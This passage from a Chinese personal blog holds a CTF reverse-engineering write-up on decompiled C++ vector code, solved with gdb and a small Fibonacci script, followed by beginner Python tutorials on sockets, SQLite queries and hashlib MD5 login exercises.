class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v13, v9);</span><br><span class="line"></span><br><span class="line">    main::&#123;lambda(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,<span class="keyword">int</span>)#<span class="number">2</span>&#125;::<span class="keyword">operator</span>() <span class="keyword">const</span>(&amp;v14, &amp;a7, &amp;v13, v7);<span class="comment">//这里是重点，倒置就在这里面</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="keyword">operator</span>=(v9, &amp;v14);<span class="comment">//赋值语句没什么好说的</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v14);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v13);</span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>++(&amp;v11);<span class="comment">//自增语句</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(v12, v9);</span><br><span class="line">  <span class="keyword">return</span> v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先告诉你们我调试出来的结果吧，这部分让我自己看这ida代码，我看了好久，都没看懂他在干嘛，应该还是太菜了，所以我用gdb调试了一波，发觉他是每次取出一个元素，假设第一个元素，取出，第二个元素取出的时候，将他作为容器，将第一组的元素一个个push入栈达到逆置，然后保存这个容器，在取出一个元素，在创建一个只含这个元素的容器，将其作为主容器，将上次保存的容器的每个元素一个个进行push_back();然后循环一直下去就可以达到逆置的效果</p>
<p>举个例子说明吧： 假设元素为 1 2 3 4 5 6 7 8 9 10<br>第一次：创建一个只含1的容器(1)，其余什么都不做<br>第二次：创建一个只含2的容器(2)，将第一次创建的容器(1)里的元素，全部push到容器(2)里，保存容器(2)<br>第三次：创建一个只含3的容器(3),将容器2里的元素全部push到容器3里面</p>
<p>具体观察过程可以在循环里下断点进行观察，或者直接步过这部分，直接得到结果知道，由于我这里是分析文章，所以就进行了具体的分析</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="built_in">std</span>::__copy_move&lt;<span class="literal">false</span>,<span class="literal">false</span>,<span class="built_in">std</span>::random_access_iterator_tag&gt;::__copy_m&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;&gt;(__int64 a1, __int64 a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 i; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = a1;</span><br><span class="line">  v6 = a2;</span><br><span class="line">  v5 = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = (a2 - a1) &gt;&gt; <span class="number">2</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>*(&amp;v5);</span><br><span class="line">    <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>=(v3, v7);<span class="comment">// 这里创建新容器，将数据压入栈</span></span><br><span class="line">    v7 += <span class="number">4L</span>L;</span><br><span class="line">    <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>++(&amp;v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上一部分我标注的重点里，一直点进去能看到这里的代码，在这里下断，随你用gdb还是ida都可以在这里观察整个过程，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Num     Type           Disp Enb Address            What</span><br><span class="line">1       breakpoint     keep y   0x000000000040133f &lt;std::vector&lt;int, std::allocator&lt;int&gt; &gt; std::accumulate&lt;__gnu_cxx::__normal_iterator&lt;int*, std::vector&lt;int, std::allocator&lt;int&gt; &gt; &gt;, std::vector&lt;int, std::allocator&lt;int&gt; &gt;, main::&#123;lambda(std::vector&lt;int, std::allocator&lt;int&gt; &gt;, int)<span class="comment">#2&#125;&gt;(__gnu_cxx::__normal_iterator&lt;int*, std::vector&lt;int, std::allocator&lt;int&gt; &gt; &gt;, std::vector&lt;int, std::allocator&lt;int&gt; &gt;, main::&#123;lambda(std::vector&lt;int, std::allocator&lt;int&gt; &gt;, int)#2&#125;, main::&#123;lambda(std::vector&lt;int, std::allocator&lt;int&gt; &gt;, int)#2&#125;)+113&gt;</span></span><br><span class="line">	breakpoint already hit 8 <span class="built_in">times</span></span><br><span class="line">2       breakpoint     keep y   0x0000000000400fd0 &lt;main+511&gt;</span><br><span class="line">3       breakpoint     keep y   0x00000000004020b3 &lt;std::back_insert_iterator&lt;std::vector&lt;int, std::allocator&lt;int&gt; &gt; &gt;::operator=(int const&amp;)+33&gt;</span><br><span class="line">	breakpoint already hit 6 <span class="built_in">times</span></span><br></pre></td></tr></table></figure>
<p>我这里用info b让你看下我下的断点，具体也可以自己进行调试，这样会让你更加理解这部分代码<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g26uordtnnj31ha0qutji.jpg" alt="result"></p>
<p>我这里截了部分图，这是第一次循环的时候得到的结果，他只push了8进去，具体调试地址可以从ida里看，在代码界面右键Copy to assembly,在右键<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g26v4wpbkmj30vu0h6jsw.jpg" alt="picture1"><br>可以得到如下图<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g26v5tijt7j312w0fatch.jpg" alt="picture2"><br>这里便可以获得具体地址，然后调试部分就不讲了，有时间在写篇gdb如何调试的吧，在这题目里需要用的指令有</p>
<ul>
<li>x/10wx 显示的如第一张图所显示的一样</li>
<li>n 下一步</li>
<li>s 步进，也就是步进函数内部</li>
<li>c 继续</li>
<li>start 在开始处下断点</li>
</ul>
<p>具体的话:<br>这道题就是输入的第2-16个元素依次加上第一个元素，然后倒序排列，等于斐波那契数列就得出flag了，所以，反推之就是斐波那契数列倒序排列，在2-16个元素减去第一个元素就完美了，贴上代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span>(n==<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> fib(n<span class="number">-1</span>) + fib(n<span class="number">-2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    array= [fib(i+<span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)][::<span class="number">-1</span>]</span><br><span class="line">    first = array[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">print</span> first,</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(array)<span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">print</span> array[i+<span class="number">1</span>] - first,</span><br></pre></td></tr></table></figure>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g26wkec4pdj30zp0badir.jpg" alt="test"><br>运行截图</p>
<p>把这段复制到linux上运行即可得到flag，或者直接逆向也得到了</p>
<p>我的这篇文章文字不多，大部分文字都在代码里写注释了，因为这篇文章针对的就是如何分析C++的vector的反汇编代码，具体多余的文字赘述我也就没写了</p>
<h3 id="总结下："><a href="#总结下：" class="headerlink" title="总结下："></a><strong>总结下：</strong></h3><ol>
<li>在ida的f5插件识别出来的不会是你理想的c++代码，比如v24.begin(); 他会变成std::vector&lt;int,std::allocator<int>&gt;::end(&amp;v24)；</li>
<li>在ida的f5插件识别出来的代码下，不清楚的部分可以跟进去，看看具体是什么操作</li>
<li>需要了解常见的vector容器的基本操作，在自己遇到的时候可以快速识别，不需要步进了解具体过程</li>
<li>在不了解具体过程的情况下，可以进行动态调试，方便自己理解</li>
</ol>
<p>好了，就说这么多了，我这篇图贴的不多，大部分都是代码，似乎都是代码，希望大佬们不要见怪</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/02/03/python/python-8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/03/python/python-8/" itemprop="url">python-第八天</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-03T15:53:26+08:00">
                2019-02-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index">
                    <span itemprop="name">python基础</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h2><p>服务端与客户端间通过TCP/IP协议通信</p>
<p><strong>服务端</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcplink</span><span class="params">(sock, addr)</span>:</span></span><br><span class="line">    print(<span class="string">'Accept new connetction from %s:%s...'</span> %addr)</span><br><span class="line">    sock.send(<span class="string">b'Welcome'</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data <span class="keyword">or</span> data.decode(<span class="string">'utf-8'</span>) == <span class="string">'exit'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sock.send((<span class="string">'Hello, &#123;&#125;'</span>.format(data).encode(<span class="string">'utf-8'</span>)))</span><br><span class="line">    sock.close()</span><br><span class="line">    print(<span class="string">'Connection from %s:%s closed.'</span> %addr)</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">'127.0.0.1'</span>,<span class="number">9999</span>))</span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line">print(<span class="string">'Waiting for connection...'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sock, addr = s.accept()</span><br><span class="line">    t = threading.Thread(target=tcplink, args=(sock, addr))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>
<p><strong>客户端</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>,<span class="number">9999</span>))</span><br><span class="line">print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> [<span class="string">b'Michael'</span>, <span class="string">b'Tracy'</span>, <span class="string">b'Sarah'</span>]:</span><br><span class="line">    s.send(data)</span><br><span class="line">    print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">s.send(<span class="string">b'exit'</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><p><strong>练习：请编写函数，在 Sqlite 中根据分数段查找指定的名字：</strong></p>
<p>这道题刚好上学期java期末作业做过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os, sqlite3</span><br><span class="line"></span><br><span class="line">db_file = os.path.join(os.path.dirname(__file__), <span class="string">'test.db'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.isfile(db_file):</span><br><span class="line">    os.remove(db_file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始数据:</span></span><br><span class="line"></span><br><span class="line">conn = sqlite3.connect(db_file)</span><br><span class="line"></span><br><span class="line">cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line">cursor.execute(<span class="string">'create table user(id varchar(20) primary key, name varchar(20), score int)'</span>)</span><br><span class="line"></span><br><span class="line">cursor.execute(<span class="string">r"insert into user values ('A-001', 'Adam', 95)"</span>)</span><br><span class="line"></span><br><span class="line">cursor.execute(<span class="string">r"insert into user values ('A-002', 'Bart', 62)"</span>)</span><br><span class="line"></span><br><span class="line">cursor.execute(<span class="string">r"insert into user values ('A-003', 'Lisa', 78)"</span>)</span><br><span class="line"></span><br><span class="line">cursor.close()</span><br><span class="line"></span><br><span class="line">conn.commit()</span><br><span class="line"></span><br><span class="line">conn.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一种我想得到的写法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_score_in</span><span class="params">(low, high)</span>:</span></span><br><span class="line">    conn = sqlite3.connect(db_file)</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line">    cursor.execute(<span class="string">r"select * from user order by score"</span>)</span><br><span class="line">    values = cursor.fetchall()</span><br><span class="line">    List = []</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> values:</span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">2</span>] &gt;= low <span class="keyword">and</span> result[<span class="number">2</span>]&lt;=high:</span><br><span class="line">            List.append(result[<span class="number">1</span>])</span><br><span class="line">    cursor.close()</span><br><span class="line">    conn.close()</span><br><span class="line">    <span class="keyword">return</span> List</span><br><span class="line"><span class="string">' 返回指定分数区间的名字，按分数从低到高排序 '</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#第二种写法，感觉更好，直接用数据库排好序了，不知道sql语法的可以跟我上面那个一样</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_score_in</span><span class="params">(low, high)</span>:</span></span><br><span class="line">    conn = sqlite3.connect(db_file)</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line">    cursor.execute(<span class="string">r"select * from user where score between ? and ? order by score"</span>,(low,high))</span><br><span class="line">    values = cursor.fetchall()</span><br><span class="line">    name = [x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> values]</span><br><span class="line">    cursor.close()</span><br><span class="line">    conn.close()</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"><span class="string">' 返回指定分数区间的名字，按分数从低到高排序 '</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> get_score_in(<span class="number">80</span>, <span class="number">95</span>) == [<span class="string">'Adam'</span>], get_score_in(<span class="number">80</span>, <span class="number">95</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> get_score_in(<span class="number">60</span>, <span class="number">80</span>) == [<span class="string">'Bart'</span>, <span class="string">'Lisa'</span>], get_score_in(<span class="number">60</span>, <span class="number">80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> get_score_in(<span class="number">60</span>, <span class="number">100</span>) == [<span class="string">'Bart'</span>, <span class="string">'Lisa'</span>, <span class="string">'Adam'</span>],get_score_in(<span class="number">60</span>, <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'Pass'</span>)</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/02/02/python/python-7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/02/python/python-7/" itemprop="url">python-第七天学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-02T10:33:20+08:00">
                2019-02-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index">
                    <span itemprop="name">python基础</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="hashlib的使用"><a href="#hashlib的使用" class="headerlink" title="hashlib的使用"></a>hashlib的使用</h2><p><strong>设计一个验证用户登录的函数，根据用户输入的口令是否正确，返回True 或 False：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">db = &#123;</span><br><span class="line"><span class="string">'michael'</span>: <span class="string">'e10adc3949ba59abbe56e057f20f883e'</span>,</span><br><span class="line"><span class="string">'bob'</span>: <span class="string">'878ef96e86145580c38c87f0410ad153'</span>,</span><br><span class="line"><span class="string">'alice'</span>: <span class="string">'99b1c2188db85afee403b1536010c2c9'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(user, password)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>so easy,直接贴代码吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_md5</span><span class="params">(passwd)</span>:</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(passwd.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line">db = &#123;</span><br><span class="line"><span class="string">'michael'</span>: <span class="string">'e10adc3949ba59abbe56e057f20f883e'</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">'bob'</span>: <span class="string">'878ef96e86145580c38c87f0410ad153'</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">'alice'</span>: <span class="string">'99b1c2188db85afee403b1536010c2c9'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(user,password)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (db[user],calc_md5(password))</span><br><span class="line">    <span class="keyword">if</span> db[user] == calc_md5(password):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> login(<span class="string">'bob'</span>,<span class="string">'123456'</span>):</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"success"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"fail"</span>)</span><br></pre></td></tr></table></figure>
<p><strong>根据用户输入的登录名和口令模拟用户注册，计算更安全的 MD5：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">db = &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username, password)</span>:</span></span><br><span class="line">db[username] = get_md5(password + username + <span class="string">'the-Salt'</span>)</span><br><span class="line">然后，根据修改后的 MD5 算法实现用户登录的验证：</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>这种题目也是送分题啊，直接贴代码了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">db = &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_md5</span><span class="params">(passwd)</span>:</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(passwd.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">  